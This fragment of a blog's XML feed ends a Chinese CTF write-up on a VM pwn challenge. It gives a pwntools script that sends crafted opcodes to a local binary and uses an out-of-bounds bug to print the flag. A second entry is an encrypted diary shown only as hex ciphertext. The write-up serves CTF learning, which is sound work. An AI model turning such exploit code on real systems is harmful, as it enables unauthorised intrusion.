class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,endianness=<span class="hljs-string">&#x27;big&#x27;</span>)<br><span class="hljs-comment">#context(log_level=&#x27;debug&#x27;)</span><br>r=process(<span class="hljs-string">&quot;./wrapper&quot;</span>)<br><span class="hljs-comment">#r=remote(&quot;node4.buuoj.cn&quot;,26990)</span><br>elf=ELF(<span class="hljs-string">&quot;./wrapper&quot;</span>)<br><span class="hljs-comment">#libc=ELF(&quot;./libc-2.23.so&quot;)</span><br><br>code=[<br>        <span class="hljs-number">0xafff</span>,                    <br>        <span class="hljs-number">0x6111</span> + <span class="hljs-number">0xf</span>*(),    <span class="hljs-comment"># 括号是偏移,一次打出0xf个字节</span><br>        <span class="hljs-number">0xf11e</span>,                    <br>        <span class="hljs-number">0xdbcf</span><br>        ]                     <br>romcode=<span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> code:<br>    romcode+=p16(i)<br><br><span class="hljs-built_in">print</span>(romcode)<br><br>r.sendline(romcode)<br><br>r.interactive()<br></code></pre></td></tr></table></figure><p>分段改偏移, n位是f所以一次打0xf个字节的东西, 0xf乘以偏移改一下, 分次画flag就行了.</p><p>最后出现的结果大概like this(一共有4截):</p><p><img src="image-20231019225443175.png" alt="image-20231019225443175"></p><p>就是 这个东西:</p><p><img src="image-20231019225548366.png" alt="image-20231019225548366"></p><h2 id="0x04-后话">0x04 后话</h2><p>第一次系统的做了一整道VMpwn题, wings说普遍的vm题难度在逆向上, 这道题由于源码, opcode什么的全部给出, 并且利用是一个相对显而易见的越界, 所以<s>我事后</s>感觉这算是一个很简单的vm题, 只需要翻翻查查找到相关资料理解一下就行, 整个复现过程下来也稍微对vm题的过程有了一些实地感受, 要弄清楚内存, 寄存器等等东西的构造, 甚至可能还要理解opcode, <s>看着就像一个re人该做的事</s>, 更多偏向于读代码加调试, <s>听起来也比较烦人</s>😕</p><blockquote><p>唉 很简单的题 但一整篇都是溜着wp摸索下来的 我怎么这么菜啊😭</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
      <category>VM</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2023 Diary</title>
    <link href="/2023/10/18/Evolution/"/>
    <url>/2023/10/18/Evolution/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="01f0446e5a38b5fd49fe6ca318f3f20454da4c75e7e801b1f87b3653a030e41e">b2c2cff769201148b8046416d86edd368bc93e9811c15aa6503663016e538cd4134e120332f8098f3abc57fc9f74f368e18fbd313ffb5578b1ede5771227f0f4b782cae1332b35ba1d8c79109424662457f1ad242bba43b0a75f5907f1106124d4efe99218b7c37d5713d7405ad2f1bc58d9429b60867cda388a2e133d1acbaa9f693785920e6f84b9dc08beb120843dfb3e8dad389537af31a4173c6d6b0f0ef5c1088ae55a60f79850584076681620d7444639ffff8dc5c4f92a7fc9b6e4f9efe502555d8b202d680b6463354041177aa285a1efd67cd1cd0e88eabdb2143c35692ac76de9cc072110fbb93dd4ca2cba9c548b117b7100b91c3093fd8ec5a633d7c39c6822098e95dafcaed3d73894b24cdd1a22db0bea6491277d8af9364c333bf264a6ede0b7b251ee521306c511c9fbbd18e9ac081aceb93bc498f29612c4a830fb7d82ada887a5996fcbeb1d8f0bb08bd02773c6d2a86f140933951bfaedc29391314cc4e13af3d3ae58e8edac90693aaa6b92e10aa61f666148156081551358506f504d2f66bfdb9e84518f777a4813509b7ad571d07c483b19b0b12c59390ba8919a24e7af117f7c954f5986b4b2d5dcc7593d9cc7dd480bc4378bda486e2d2e204326cc0ba149a9dae401a60e642239fa8d87ccaba2dcdcc4490b06885124959bde993933db72eac3e5c2b2068b6e780ca38c8f1587b01d75e6e0ab4583ff8a9dbf4fc141701e4d260f3d340c9bd42b0dda99ec54f4748861d9d8363b0c9087abf361118a8c4011e2775edc039a2b6a3e8a71f4595c3c7c99ffc251296b400593b8a2b8489e2cf039081f654de7ec7e6a3574dcf8456c2f2b73296856f434aa13625fbe64a4b72bec86949dd9b6fe6b326dc5ae4e6e4d0e897d3e77491d418aabab981a35b91b9735db0b9b0969bed43f2bb27f7c4bedf671bdb486819e2c0790169cbab4ec48fee94c3a4168bb720babceaa39e2ad33c9ecb6d94dd2d6b203f8f3ed7ba0fb95d52f2c6e39e86aa4cb65b99cf7224e3c94de77bd8eba1b1f5f402e5012821f44972fb4b07829591513ac2c0441b57b6dec0483d3893d0ee6493af8f56915cdc5bdfd057fc7f79e608afe317288d38bdcb59e2e0b22cfd4d9ee43366c324e39d4a538cee69cacbb27b5b0a08036bca57f9fb1528e60c796bc9370ef5fe87918bfc7ab4261d8f70fcbf2a2b7fcc9a5d85b157b4b8adbe9f0f6324423de0b9f40a88b73173ad0c057776359a8c8a50f713fadb577c3163b190673d484218ac753d6e889ceba92714103c0095a9373c13db1a96b25cac01a3a7376988cd031cf3e0e825a32586bc399a8d63bce7841b40b90d0cc91db36dd5e4bd337fb804eab4863f0118d991d9734d92eeba495f32061e2ca92bd49d1f89e5538f002015876f2ba779668e2edf9127c582e0b8467109bd39b21091797a4bcece9f46c8646bf27348a1164a4d56d3bc946ba53f8896082cedba9fdd47f39173631812a0a65d5c618c8cbf0066d3441aea994838669b60e197ec93207ab85b7a137acae74bfa2843920f47e8f7038b09ce76de1d14771a4053e070ff62bc7aca8d04a327806d3d099af3d3c44fea132e15041482830619cd93ffbcd4342fe08bdcacea3d270beb1ccf8831568d949a999ca7538c52c534e9fcea0f3919882a4ab82efdcb0aadd790539699aace02eafc6953fc374f4d9e07401d996671534f8d3344204bba00da0ad674e0d4eb927459eb1f067b5e421ea550634071362fcb5dbfb54930568587cdee63c8c2efbbff86b3d9b3f2f6108af4b6daebda43623127412b0445285ffd1d0ebeee288d120d4f956f58327956e529e4c47586d8afe31427e7fbae2dfbac4e729e1ff3a5a5f9f0b69a486a300ab2f15f3c1d791abda03248a7125e1e3ddb3993b6625918f634d1bdb9ac8e7df7560903014536b57329472bbba12888b0940c1e5369903abb98075ba82e121f12ddf94d169e58308a4cbdda6b04aada7a29dae5b118ab5da780110128e09e8fa71d22f5908227be658475aac04e352b0ef11d7d7af5bb31c1b76eeea750d0ad0a66d4d081e690f6abc19da9cd3af0c2bb55b961efba5fac0def589adf63b72d6b852fc43737345938d99d7200e32732ab0ea910b34206884a7de0bdb2aa07c2571945a02f7fa620846a52d860c158bf5d8079f964714538169bb95412712badf3ad541609b92d6d9c79a4eb797905d1f78ba8cee5da3aaf0584fec9422d7fe893e27c29cf232dc99220dc86ebb0cb8a7b302f857e7e913732e92fadec0531d0124c0ba673963a4b8373145098305a07effc97a9bf88e91e27cd97af4d3067d433d0c32c6970d9e64b7bc86cf613ecfcaa5387ccf30e3a17c090a4d62ac27245b5c5770dde05a29067149a4c99fd8e6879a2f46c3d2905e3819bc1749ad4fee7eb9b1fedd71318ab5797178305afe7beeadb97145d58e908b47e9c4009f37e44fd37e233371ae2a2378be92227a87bbb5cb89a7e3dfbd69b95f65cfeec19b45bbfe755db06618bc4b1708cadabab4e2d482e1c7d79c48e714e4d18fe4b3e33ca9b569f543f290519b66b42f2275d6ca39e059f5c12642254dbbcb008c2d6a1f520cb02e99a57fb65ac7f0e760ca09a671957be2a8f4526b3dcdbe47a003b699178606ad1e591d411e19cb7af7e5457143b3d34990f8d30dd5745497ffd88b390bff9bd74cb9e43b1b86978fd3624a34ee788cf49dafb791c645c7afac5e18d39689b4fa01b4d75967d225741c0e454ad5d7d7fb71c93933e447518eff1f62b04d20be4704c08a074eb42d8acaa47fb356fa15bd35472a170b446d2bb4dc69f7228e19e893060b1254861734d8172d813dd73ee4551c412dbfdbb89ade4bc676bf472535dd71e4a802eca14c14e1e0eacea172e38b2d2d61a48c3f1e9279da3570799a4ac7cf70fc3c1c36ac10716975658c130e7ff2c232dc2628dad489f0a9fc84506093bd8c001e112abfe1a622bad441ae0391c5dd64e22cc8c7b9c3b5977618a79ba920106ac01314c9a92e803c9b40cf3205c54ccf52bc2faadf9613892afc211e6a78caf2c4eb27b5f7cf06d6bbf868fed621bc4a526db2cfcb3fe0a20d691b056b0f4f6d827e6119d3a7db734c53b6217c0499ca72dd28ca3a926689d2433009caf4b6304d1f378aa16fb898a812c4b76bd8e126b585c92d538aca22ff13e4ca1327e4d6c26423538bed68016cf7a7f6a85c38f98045c458ba1b5f141e2f7eef1e487b0c6259af4cd314fd8731f3ed0d2cf2855edd1eb42a213864eeb28bd8c706ca00deb58e7db5a09bad21d9b5847fd9aa151d2d611905f9bc013b89a8c673aca23c965ff72db4ce7f3f36911e180de6c7f723cadb5330ff6505853947b55d281dcc4c0b5c296e798f2e3dd6a0608b627bc3c77c21e131d50ac497f182311dee05a11b18859d880ba053f361fe24b9c4ad76592109f7701cf79aeaf1e41936c7c6c86eef62d1c235be9afa89f83d69e6e75bcba6d9d365d21f6da85ba285f711fe99c4bcdfdba85f2082ae18a36eb327c24a757776e9e37f4183c5e8fc79e0f469010de3aa6dddea2af4d46e70ea81551ea02a1effdecb839e6a429d512eb136f94c5d8a7276e4aec88040593ddeb09a8bc98b49a7d3dd769532b344d19fb07b3de11ab9f412de37d8410abe9b6f9a75dc2a1d7fb710e91f0ce27922ca0a3d45e623209fa23970570745b3cc7734424cd167d74d5cafe9cdcab2907d338290182737da339520770d2ad71f2226bb7a8f812731f11b07bc97b394c38d292910b57d3cc214aeef9a3007572e969ba0fe04f88dc6aa9e26ad17f34d7f9e906e5a86467c0c0d1684ac306a53ab2d4dc14f887145da43e8ad06b0acff976647fa4bd6069c70a1380bbaa45baa224b0fa301d36fec7546a8ba7bc704286300bc69d905dcc1dec12b50f2621c5da5bbaa1118f797b4e0143b4ef5b15497ceff6e27c6b1099825cc5fd1df0777dc77ba1f507cc609909fe1004bcfe2829bc3330851a9920a2d8dda2bf070aa388d59ff13715ec5ab5c7dabe30843155592523ceadb0fa5f6daf3e72afe7e6d5d07adacb6aac8c4aca995809c1450e8601a0a176db74bcb28c1210627a5f10b7b90a932570df70cdffefd56179e86868dccc1151dd7ae2924de8b3cf7e65ec4b0371b51d732157553c1181eea65db5fe0117783e7f81b21f8fe0c47d1077e78d496f82edd1dc77b24f2c01eff8fe47cc55e73a9fcf44244ddeed7c6f08ff0c579f0a0e72fb268c35978cf6277b05548827eb21eb2d51e5c5e0755b4a4701ff5a8c112791e0069b45383aba224f379c61d457cbb6fadaad976c24927c260c9079e16745b6f1ebc4b3c6d1094364696e334bc3af1469e8a19b5394d11c2c580bc194ebce9a9e06c63f74cf8ab054f058d5137dc58e72bddb361d0db9622f398d042dbfa181ab8e033029280ef9d378036cdb32b581a8b9547f42e551a7aa624fb921854b3a82601955110b5c4febf21ee69cec54b6cede92f1c46699698cd782b48c72add7efcff350b00154f026ada828e6043eb59550a6c3532884deadcd6932876637f7d0520637317a80a573918f02959c98e821bbf64d7afca0d0990b0a14fc42183805682461cb312aa4a996527a5b38b4f11a1b37457a9013ee92099a23fd9187213c6744d7824b6e598af9e56acb99af1924dd06f75eb5d6f51a3e41d33ba61901ae381657b0e487d44695afd353ce43d181e8e35b634ef57096691cf031590533b1c57727fa3cedeea518afa70607eb63b62d777b6b219fbb7f4ae900cba578630d645a24bcfe55e81614e1c0106a329704b08e57367c7839ba6535394a22b4977945b8f91dd0a06b90ac1d8c53e8555a3bb1f6cfbf4ebe1d1665c2ae24be7f160471c233816bd1ef4a9902dd99609ca01e2910916ea7df1f0232635dd3dae05bd7b83357ddd701a0229bc3f60d0a62941de8ab824237240c06fcf583d132ec01bc61e97062fe9d17e8cbbc127406e47d0111f83999660719b0628f9628c6b1c28bf7b891320e563156562747b27ae412119140242c52f42dda9f1d9fd568cde5b91a1f1cfbf551c0818e2c3926498c217f12031f7347ab0209e0331fe221c9f4fe48163e3405c4f18ab5c047da56cd10fda489c0512c2727be5f941c1438c92b8300a218ec34b37c1156f66f969b756f8b06845b5bafbbcd4de9b2d8186a39f57033731d5519266f597da5a91e48a653fc3656de3acda67f43ab5dd6937bb2bce6b15088ef31b902609d75e95b123a86e39c1bee3a7302a53a46592472e91a65d18a42cc1462dd1e6e6bdf624f9110c9c415d198bcb79bf67c6898b22cab4c86ab6dc94bddb38e5e1e46d9ea81362e325511fc350edec784b857763f2dc33a5af39c6b1dc38d23b9db6f6faea8fa4fabd11d781718ed589acf9911e3969aa04edab79f4d5cff9e6abc41e32ba7297ef5e01b5030a69ef556564ffb9395572bb05b7f29148591f0dbdc675db254451b3b8bb64b75dce1839a9301754ee22718811a6ddfc5daaebfc775ac3d327547ec34a0f0336aa09c4cdbf5c135f2a6497e78505aa047c36f7a2f048b66274e84025f54040d675b6b2a3f7c7998241d24738bfa14b937a0cace79aa179b67cf94ab8429d286423933e3456f08457a3ee134f4a885c8c81c099e0564a892adfbbdfd94d5c5cd9af4087ea4e6619b4ed8bfb0e1af22faa440fc46572bfbe0e4eba3a4eb82cb737e1f3e53b1d2e5f5590579dc3db92910092ea15cff85501068872bf96ab3c378e219cbb91592ab38768f59884d732cdf62bbd6cb163def3f77454556c8fccf3d1aa4b508c190a0ac86833381de8ccca9b3b0b722951805a73ac673bc6456b660feda03f18b83cabe70038802f6cf8d9d7332fc789d1ec4f90e40334fed72a62cdbf46f693b60a6c9928a4372ddb676dba6b736cdaf64ac3c37787c86215f476bb0d5cd6c0f3332d697ca4be16514e43ebf65e9b2c8cf9b08dfb340ffe8610c954c478b8f99650f283acff04210eba110c5d949d05e7b783cf2d0727c8c2cdf7d3ec972ef7bb63624e9c85c77fc75642545cb51c1e94db02037b0ea9f6b361af262176ee9b4d16f504cd5db8c146861b1177111ec1751c77aae0e52fc600c9e620e238b98f4ed6e329dd0390b3e0291dc8912c4cceba98f95ebf744362343a9dbf9c9bc8f05925cf4d693f3d5e87d37619e3a664f3f55939f82856005385d74faabe4c70ac45c069addbaf9c59a806eb31e4340a72d3de9b4bf70c7259b060b933951903709abbaae493976a79f6165fd9611ab4512c71be946043dad9a2bc1474aaf5e4dc5787fe43e98746b10aeb12f9c3ee970e1a9367ca1b4db75a75858bcf9c05c2d9bf6907bc4a89d25b3fbb97a0f32c51d83e8b27c1241eeb472650f7c7a0045e510425d0751042dc9bb41ba75f7f0e1f1a951f0a8e9b9f8c558970812e58d44a259347c3af230f3584323a14225d531b1b47f87c76f6a3cdbd30aca7e5105dc3287cc63efb7034987260115a265874638a74f189388b1cb715f17c3a4fe1f02ca5e5e0e3fb55926e3357655687e30f32a3f26eb6ca6e01fbdf2513b4ea2b06145a39756e41c1c48906858737de81ad2726651e06fe06ed3c4eb3c9d4f9541b443973a898bf29484095171600e4b8ce19211137df81c52b60877bd532b2dbd6404dbf4e24eb822c3f11dbf49a0d5906d14e91853e182d92bb408a4def7ecab94514d09c00bb83cad2eb34cf62e4a5300b1a95af5923f6368f6aae0c5f76960151e3e1a9c63194ad6239f4486526b59b289c82b63af096b1a20855ccd8bd041965cc91e557f261f9c5ed1826110f4a456ba1e5b06916b6df0d88caea6f5879f317c90def8ce9958a730b6475f590c0fcbc70a8ef2f9bb543765cdca5f44dcf87532ab026d61d8149f13e4ebc5e53beb1499dd3c0591d5dea4c5e6effa478d16c411c904dbb55758f13c73564fde36146586e06f8c6f43a41e1c9b641d04c0ebe833fc1e2f5a908e058ae548bca58cf1fa5d5ae92cdf4eb7a63f57823d62d558e0016d6532c08f0a4712d400a1e3425b2c20434cdd7f3568824276dd50479c0cd9afb749fa78c5bea2d110b741a43ce65c240491a67f56f9cff3ae2ae9d9e44c213489313f0e3db972a6dcb76d4a9a3f5ae3f124358b289a7d87fee0a6be10ff6ceb29eb9821f0d83ddf1dcbf918998ad817c97087ce6b4f03a644d7b03529cd9f888eb46815517ab673181c7440ba28b15b3ea7980de37ad3f2a67d09c96c01d699c778e62dc1512b7d1380121c3f583917ff7880f0cb97d5a054dc2eaa166696bc785e5ca86087ae39cd76fa554c086f5d6267b631f59376dfcc17c0bb1bb3b88d9d148aac709a6d2393c6a9466b45ea035c0a2512092b16cad9823d0d8026ea3b66ed306376224e7b67d3c27fe83a23c780ddb35dbc28462f03224f2e3d1c2b920696c1b284bba5035395c56f7b8cdb24ac33c4b26b05247e61b464abbfd4f764423053812add1764fe7319441a7ca5fae5f5fba3fa5638dc5df0ee105448e1ab789e80d8b126f70de8018a9d91bf22d88a6e88f47147e3ca367cdff228c89e4b8addc7ff5c4a8d8fd259a67b121b7cd0086af3b256718c6052b0c570a06d1c2dd0a6589802ededa243ad3ba17cd627f68d937617bd05cd5fa57b2d9561b51c2b7d9058d41c7dfc264e814b24254d4b76ae1c5f9399e2552d642f50fde7237d32ee06371e0250f1be056a4bbf3a27d4650ea6e4bff61dcde60e8bf66d2648dd3d7bbedc13e688d7c971e4899f25a290233497139822fe8b45d45e2bfd7f0abd30f9466009e09e727cb963eb6d3cd62789f2c72f6be65c65f90a6fd6b8505517ce927ba22bcd37ef2117862c28aa34e9f91a268e61318b65a970b570bb45855cf68556fd88cadff15f7d4a64038d4660f7f7144569780e98789714867a34a02af688eca6c6a219fad98268abcd72c2767262a5e1ca4c751046a404cba8cc0c872283dbf4544355d46ad3740169af4d0d5ade425254dab2359e0689911bb94c1aff49a9435803ad92ebff75f07d0bcf90c14845f392ea5cc7e7ab8f6420f96209aeb88b4f69886324d94d1cb6495d27937c5d214aee4eeaebce92ac9bd048295d8d63a0b863f80f825a4d695dc01046300fcdbcfba1ee6bad16b4d2c0d8f451dc3438dd38265293c35ea95d7b08da20767e241abc4571b34bad3a55749559ad2409ec0bd7409d650914de39fffbc6d5d7cd737c8195c78aad2bd7175f3bc9bcb83fe3879300ad5550d9945c865e55740ec23da0100936ab525273242b9cec49f1121e273539086684c1be0fe91b8909826c1995cc863f9b99cfeb4c07a834a117e651129dfad61b46be7c7d6440e4e5b56bfc926ef5f06b1aa3f665da0ae611e2f7a36dae81102d39f40b647136ae211f490c8736c7d1cdcfa1ee2a2a9a57973224821ac8e49a4bf0fd2858b8fc4c07341ec98edafe5d746f5ddff9a7672734dfe9265bc9668ad316b034ccfce56d809cfcee0430085239a5e0153027197faae21ab3b68a31150d9c3554d358dc9564b3fc9b8575f4b4ee54447bf812f24363b56998539a02860435d57dfdf9626cdfa8f2c15c00b3934dee9fd7e67db969ed40dae749986132f87482f561c2d304be05081c0e765d42a1a092ce7ad7b48a95eb1970c6f1d79d5757c1edd9c4676557a68e237745b00619ae25b7b4d2e6e9374047da5482bf5daf01564f398000c574a75084f1a32eca4e2da339584ee975208120d5faf32efcb91de2d135fbfd0cd0a857b5d5bbb88a4909f1d996704fe5f0fe09b15bc9e8ae164d1ac2265ce81c39cf3afd8aef3e37ed2408c0ff4c44434504ef06bc12aaacf83fc7f2cf92389b87b22234f067c1d571ddff4419f2cb7cc6e1b1d391123b068b22c1d0141ebd1f37195f59c5f9e5124f883b9385940d61b6d1ef4387589a1a977ec58efed0844a894a9a5c861c22ca2c0a195459344cc8bf6f8fb5ec4b0e6927aa81af51ac4a40e9fb7d46ae24f6ca6362bf22b8c8fb618a71494364a125f0573a7c1c4ca80ccc11c543ab178e27142469d124a1aa686f9b7f1d238f6888b7ce753f547c34c0c875a5231d5755147eca33827d67fadc8d8460cf8af7783893b9b2c88f590d52a1ee7892a5401c8688dc99f5f9cf8427038633eeea60e32c4e1f335f7adda1460749a9255839273b30bee40027cf12ca9d07f2411227374c7473a975c802151da9324e2f3d4585aaae71f7f7aef2aee95a5b97c590edf61eeaa5e98d05d2cf4431ff9ad974241c3b951e0a417836165fa129b0731acb96a1f9bb1cb21fa89f0316f79cfe28427279571c30d6084cf4c9ecdbc4982b86914679ce0a7c63f0a08f4c1cde3b12144d50246424e3ac5b7fbad36f028fb9dd046ae0a2c24e2c97aa774c58faeaad646ebbdd6732a512ac1a11bf3676b8726cc7f9cfa19970978b3258d05d0db12362fb09a7f5ca56d1f2f06cee2125fa580c1e62a4ec94cc0fcb17d5521b687955c6560c1ca5298ed87ec5ec72e3ecd9c4b15de08221c1e875e83c8e458514b9659550714da14f113d668fd02343e1357d6d1b8e20233948f13866ba0e349f7c4b70e482a2b180952c5dd054ebb6022364e5796f7db1460d0824f014d6d105886e724de5eee2098d9193f16a2ab487cb009172e526859aa4c6b21a107ea8daddf1a4239d28d4bb984efa1120832affe344fa38b904de2af12f9dc0dcc8a6123e8d94240662e1dea4244748709bdcf374531b0cf4026d62417520d6e62c3c878cf24bc6a3aa97d66778b5ab1d7ac682e383ffa2e40ad1bca32760162770bc869d374c57d0c352add510589080ba12264a07ad26482cbe71b3596e08abc9082c4e34900ec37b628b053812de9a0344d037e09e50eac78aa4c1c64f6109eb793a09068aa2ab48e6824c27907f716e705b0ce22d2048c7277f334a14ae5955087479026ee6b4ef5ccb8c6a098db2a3bb1e1397753720b0cda59b137e55aaf53126a7933893bdf396fc832f1a0c14e510a0be8fe95ee46edcac8e50dd2ded79383908cb3388719f76f2346d9ace601faf7a255cb05a82ff7759cbca895706732fe45a4080dc9d7d772cfef53223e9dcdbd8af4afffde6756fa4effd4971985b385066fb501083a963bd8c5a24795423d2412ca5f680091e5158623f89e387a81a3246b8eea6a38dc7fd0b1993e1f7a27024b09c917440cf0a1750efb69bc6e9395a2b6a9eb36428a01c58932c539b1b6f86844d483eeb9a4bbb19b010a316c0f43e75be65a69b27a099f9e4acf1b481f6b71c0e1192d28fc73157dffacae4d4f6af46466885ba0f673cf5fc1c8b8288648d5e6243d2d5883531a522131ed65c3fe9c8a255986a5778e65523ad4ca223fd72af91a3c5971b8434cc01e35d17f5093c14d14964a06a649ece6c7a1bc700e8ff604764742eeb2bc9535fa57e7391c54929248544eb6589e3205ded594dc951eebc1a4c91691ebdcd5938fd8f4d17896d7b995164285e26e65f1a66a155e5408c2075219b7277d555ceeb06ad9dec2a7274295af909be1fb58cd673a69190b9cdaa5871575d04b039c8bd8514f4a4d058ce3a8d071a6b5bf00aca215a898faaa86b52b9427385cd3178ac572a6cfc3ca1c2f0ce63df20071c78962bda9c29bb14f1e35d576677faadbcfbce91a915e17bfcdb37e54ef00005d792c4fbe7ec4d9d7f60347b37bf39f0dcc5abef12ba12b023f1de1992f5fe9491d66f8d04ffb48809b49318603ee59ddcc81293ce96a0cf7f6228a2bf2e98e78cca3f601a6da18bc80ead90058733a1ab60fc979fd213dc8694cc82d091aa92776a161dc6ae5ad9b6d59c4d21a068880850ca038dfe6a05e0502153651201cc89c53ed48da5623c944f89f583df478710808fe892fa99a2f367cbaecdb091be52e40ed961b8eccee6cd66fe8388e00bf8b99836a60b8dafe0d424912466e9ace6075ac7c4faa491c157e384595f1977a2a56e32de12fb1d6ea0279090f4fcef3b2595f72bd5be320df47746189860bf11d768eaf745e620b0adfdcef99dea8ac888bef2e6a5d80b127c622febd391c6e65a4a66934cb04161742392ad0145890ed1297ed3a5f4ad116ffc19e05f80ebd7d6b9e39ae70db4d64499810b176a3a57b0a8e31e6366cad23440c2b1f8386a265b5d49de922b6978598ff23727aeb7ca266c4ca87e90c8fb901282837e4b36230e36e8a969813272cb863bc190788a85c4c953a6d7f5e56d256061a22982d61b04e2d671f6c3115e22f2a73c93c657820ee359026fd26343817ac4daeae4f49936230790f631d8cf1dc5cddea68cee0ae0b18f4686e273f2846f2890456fbbffe8c15de13fad291e43211dbc1fe00827b83934534f7db514fe44a20cb9efba22733ceb93f5e2f3973f6497cb13b1e2ab749a732c051bb215570508d80ff7aff9950c8dd6777bfa439d439298c2524a595f26ba67bd6d616c8d67804c2e863181e68e1985a88d2d5e9372ea8d12ddc21ddbaacf65a46512d3723f50d91266ecc37eefcf7ac30176595ff9605da3e5e1c53b79fdd61887f1bcf83c72852c58636847643817d8f68b6e08c16fbd98da2577faa21eb7daecdefa3e62f9c905bdedcc5ecda3c0c24b0263816fbeda6ba2835cb58ef10ff66114aefb782a6292472f0dc24a6364e1c517b99fe0bf62b6cd3b9cd80bfb52f28c57f144378fc43461280c552267aef77febf59977edca4800fa29313d992b8848dd3e8896195df4a6ef30e190f1bacf09ea15c9916706c62b1d6558a555641c418f7d1de3ff806bae7833604b6ef1bc29c44150f9b458d607b477013cac03fa22c91d7393aa471c31e4afb246337515221c11d989af4a123a9ed8136acf2e53e89bdd0bd07526c95bc07f1f8ac4f13e30199fadf5c353fd1b63b6d086ab8001f7e696135243d5834e8007270856f7442f245725e3a1974f5345a3cfb1b462d4766802288d601766481f2c8d8a1bcb1074e7d5de5a455b448d3ac878add246e1c246634959874a40be69ecea1ee931c9ec8124167dd29c96d3542aeb0ccff9c11b2b44d7ad93329fb5aa21d9b001af1b580b38af12d5d03edb47062269a6eb78cf031a4d8db754bc56c08e87099e67a6d7857f8c670651bd2ffad0cde91f42c9b0a27ca076b9f748ca03e65495ee012def14adfa92a94ae56fe5052b59f7d3a13ca99f333a4cce021979d8b73f4f38bf45b98addd342319596112536d1ca2693268f8253f77747d8bf914ad80edf10a14a3a9cd03a678d2d84f219a6eb4b5b7c6a7ed5dd5f9095eac701b2c0b2608cb6763eb2002559fe18cf2aecf63dacc957c32b332fade4275b7fe496ce62380672bac969f5c542eaa181a4bc38945d765e6eaa5bef26f8fc1e40b30472137b737fe94dbcf49aba5aa716e5f19900b0ccece6a5e283dbfc27c9166be7056c752d47b417ae1a7180bae44af7b1e36ef403ef12fa4305f8a1e1190c62a3efdd2b03de138a7c3c12d6b1ff0f16e39306c5d0214d4495ed54da431903a9395c6481adf02e78017e37343e3c19523734187227c5517a8db0e7a5769c551dd934077003e635010a3d9b66a4df52452294bdffe6aaad484c424520c0dd0be1a535078fa6eb2ee79a1332c89ee538980fbccd1fc14aeb91e64cb9451de588182f68c9546b79d72e763c5d604c1bd33f47077182a7eb96df5390078394e9729a2d94eedc477d64285038b3109483aaa7e693330d655c5bf44562314f4c7d0eee6b5414894799e9d39a29c979337dcd3d9a893b9b0cd26a9cc77e7c96544c432dc338ceb670d14e6b5d467028f4ae51de28cc4abb24ec944f3a9ccddd227e8b17f6260e47dfa6133f63a60451473df8fb5c877bf9c82b486c199d4cb51ef69a53d93f221a9933c1bfc6f34c8b78a03e5032d423baa25aecf5b875b85d3a6873382455e6964c82a2e3ce1fdff0b7c69d3dced18f02702b46a647424a79b30498ebb24b2cbdf48a8474aa6f2cecc0781b3d2fc65e326854c9cadf6aecb18a4e69ada75e4866ad14be5b9bb277c0ebf02b31cbdc65a765d9d09a57972cdc4a69d062cb281173707219ee7f26268690b45566b26a8ccb5c79330051559d8b31c9998e555a7b15155182070cdc0bce0846fa5bc22081f6e9318f7f4771857c42b471b3fdc41d46bf1ee5815674255a277e02cf29919eea5713beb6e96a69b172e3e17073b2e5e15aadebe503f7edb9f2a7f14919a87fb4d4d6a486ae01e1789583cff9e8776d2aadf632c438d7ac75a0c726446a6f5fcfb74491f4f5614502cef0b327964214466fa85db004d2efc045e2c66fe41b6d5d3c94c434162e4e9655721b1f866a94a87d8281ff19de4a3c815e5c53c04d9a349bbf9ad6ffb1a056c46b78ab678120fbafb196a6400ec4cd1547cdae700b81f7d6962e42403e90c657b867c66a4ef4a4eb2f8f4dcb7d798456ab05ce90c934ff8816368caa621344924c3326d79b5b93fd17c7118a755c28ad8581f449b0d7fb1b55437e302c4902a5f78bbd0f7ea0bf001a0df083bbf6788bfed13732fdd007f9dcfeffa29ef8026f88be90795f24fa336d76f8a4dbc39abaa827074bf42657aea648db8f3a5a18257b71ade931b853126766cd3a440fd2f7ab05ad461689a0501e9bbaeb44fb9dd61ae54c6c9de6e7845b62b827800ef562d2a55e851bd382e3c42250c74d9d8f955c0723a2ee04fd5cd442e1f0a7ab6cc66de5bc70fcd956547a29dff13649d783404de275ca095faf36f802787b53b75838d0670155c1db3beb9faf3917d75b88e6d2e3c1e15c6b3d5d692dba8d2796256dcc5721c69b870ef0d3ae0b25ad967367fbb8e4627e11d2d9e4a42fbc62b13ccf8804f8f1bf6c6ca2a5b584d979977f44d9e6ae6091d2559f27536f49b665e4752a909a06b87f60e48ed3d1a1ccdd4e509b9babbd70244ac300e023897036d117c3870e79aedde4197398f7c77ba1fd6bec4bcfd96214aa781d9a78eaf156f382c4c836ed406dbdd7823e54fd16ec597bb8dfd4abd668e4886d6673a4731364c851a68239cab22d17fd62795ed57a259ee6b81dbbb81479d53c79c1cae8cbb4146173651ffba53d39fee467526f7442e14dddc63374e53ed36333d185d51d25be8ea3083bd29442df4e96024560c747df4b1c0522cf04851cd3e65e81889785022275e144a23a23ea2d2c54ca08c8e42be9fe82c400acbf7ec090b01a5b3824654039d9ab4866695b6eb9fda90296592478333f93740c6eb4bab44811f1922e47c8bfd1afeb492ad066f56fbb17d3632667a6bd9f15c8fd7f0d92f02dd2469e94dd931e06a5c0a298b537ad6d26409fab7b755db6c93ee15acec5eb997670aab477ffbb02005937639eb5162ed3bc136ee379b5b3216bb5d408dd955055ffd263d79d938f21ae4fcae268c888d3dc6d4c4c381e4148ed6871f2a57b0c257d7e90f1b4e549f2f75c8598b9f6a7c8d0e924996c160979b3aebefdf02e502ca2aaad8c3f112bf78766d51093ce7b05a46ac3abce8bdecf260bb05287f21229dd63f4c2f16d734ad56e7d9cf1e6aa0d956dc871b31e66f22c1d2b21cde960155e86f77d0b79f7b7f597b3a6995be8846bab7ed60f4313e321d02f9552afd3389b2f33c8c25de8b89284a866253ef1607f010ca294fa417a6ea987e7a1f611df8182fff5a